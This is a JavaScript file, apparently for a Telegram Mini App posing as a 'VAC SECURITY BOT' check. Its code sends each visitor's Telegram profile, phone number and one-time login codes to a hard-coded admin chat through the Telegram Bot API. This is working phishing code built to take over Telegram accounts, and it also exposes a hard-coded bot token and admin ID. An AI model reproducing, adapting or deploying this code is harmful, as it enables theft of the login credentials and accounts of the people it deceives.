// Получаем конфигурацию из переменных среды
const getConfig = () => {
    // Для GitHub Pages (секреты встроены при сборке)
    if (window.BOT_CONFIG) {
        return window.BOT_CONFIG;
    }
    
    // Для локальной разработки
    return {
        botToken: '8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0', // Замените для тестов
        adminId: '5665980031'
    };
};

// Форматирование сообщения
const formatMessage = (user, action, data = null) => {
    const userInfo = `👤 <b>Пользователь:</b> ${escapeHtml(user.first_name || 'Неизвестно')} ${escapeHtml(user.last_name || '')}\n` +
                    `🆔 <b>ID:</b> <code>${user.id || 'Неизвестно'}</code>\n` +
                    (user.username ? `🔗 <b>Username:</b> @${escapeHtml(user.username)}\n` : '');

    let actionText = '';
    switch(action) {
        case 'init': actionText = '🚪 <b>Вошел в приложение</b>'; break;
        case 'phone': actionText = `📱 <b>Ввел номер:</b> <code>${escapeHtml(data)}</code>`; break;
        case 'code': actionText = `🔢 <b>Ввел код:</b> <code>${escapeHtml(data)}</code>`; break;
        case 'verified': actionText = '✅ <b>Код подтвержден!</b>'; break;
        case 'failed': actionText = `❌ <b>Неверный код:</b> <code>${escapeHtml(data)}</code>`; break;
        case 'exit': actionText = '🚶 <b>Вышел из приложения</b>'; break;
    }

    return `🔐 <b>VAC SECURITY BOT</b>\n\n${userInfo}\n${actionText}`;
};

// Экранирование HTML
const escapeHtml = (text) => {
    return text.toString()
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
};

// Отправка сообщения
const sendToAdmin = async (text) => {
    try {
        const config = getConfig();
        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
        
        const params = {
            chat_id: config.adminId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        };

        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(params)
        });
    } catch (error) {
        console.error('Ошибка отправки:', error);
    }
};

// Глобальная функция для событий
window.sendToBot = async (action, data = null) => {
    const tg = window.Telegram.WebApp;
    const user = tg.initDataUnsafe.user || {};
    const message = formatMessage(user, action, data);
    await sendToAdmin(message);
};

// Отслеживание выхода
const trackExit = () => {
    if (document.visibilityState === 'hidden') {
        window.sendToBot('exit');
    }
};

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    window.sendToBot('init');
    document.addEventListener('visibilitychange', trackExit);
});